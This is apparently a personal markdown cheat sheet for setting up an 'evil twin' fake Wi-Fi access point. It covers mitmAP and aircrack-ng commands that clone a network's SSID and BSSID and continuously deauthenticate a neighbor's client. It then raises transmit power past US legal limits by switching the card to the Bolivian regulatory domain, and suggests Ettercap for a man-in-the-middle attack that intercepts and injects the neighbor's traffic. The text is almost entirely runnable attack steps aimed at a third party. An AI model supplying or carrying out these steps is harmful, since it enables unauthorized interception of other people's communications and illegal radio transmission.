# Fake Wifi AP

## MitmAP:

On Git folder:

	git clone https://github.com/xdavidhu/mitmAP
	cd mitmAP
	ip a (info about interface)
	python3 mitmAP.py (execute)
	
## Aircrack-ng:

Scan the network and wait for the client connect the network.

	iwconfig
	airmon-ng start wlan0
	airodump-ng wlan0mon

Create a new AP with same SSID & MAC address

	airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 11 mon0

	where 00:09:5B:6F:64:1E is the BSSID, Elroy is the SSID, and -c 11 is the channel of the suspect's AP.
	
Deauthentication or Bumping Him Off:

	aireplay-ng --deauth 0 -a 00:09:5B:6F:1E

	note that we once again used his BSSID in the aireplay-ng command. If our signal is stronger than his own AP, he will automatically reconnect to our evil twin!
	
Turn Up the Power:

	iwconfig wlan0 txpower 27

	this command will boost our power output to the maximum legally allowable in the United States, 27 dBm or 500 milliwatts.
	
In some cases, even boosting power to 500 mWs may prove to be inadequate. If we try to turn up the power to the maximum on our Alfa wireless cards—1,000 mWs or 30 dBm—we get the error message below (some of the newer cards can actually transmit at 2,000 mWs or four times what is legally allowable in the U.S.).
	
	iwconfig wlan0 txpower 30

This next step is illegal in the U.S., so be careful using it unless you have specific permission or are a member of law enforcement.

Every nation has its own set of Wi-Fi regulations. Some allow more power and more channels than the U.S. For instance, Bolivia allows the use of channel 12 and a full 1,000 mWs of power. We can get our Alfa card to use Bolivian regulations by simply typing:

	iw reg set BO

Now that we are in Bolivian regulatory domain, we can boost our power to its maximum by typing:

	iwconfig wlan0 txpower 30
	iwconfig (check output)

Now that we have our neighbor connected to our AP, we can take the next steps toward detecting his activity.

We can use software like Ettercap to conduct a man-in-the middle attack. This way, we can intercept, analyze, and even inject traffic to this user. In other words, because he has connected to our AP, we have almost total access to his data both coming and going. If he really is downloading or selling child porn, we can intercept it.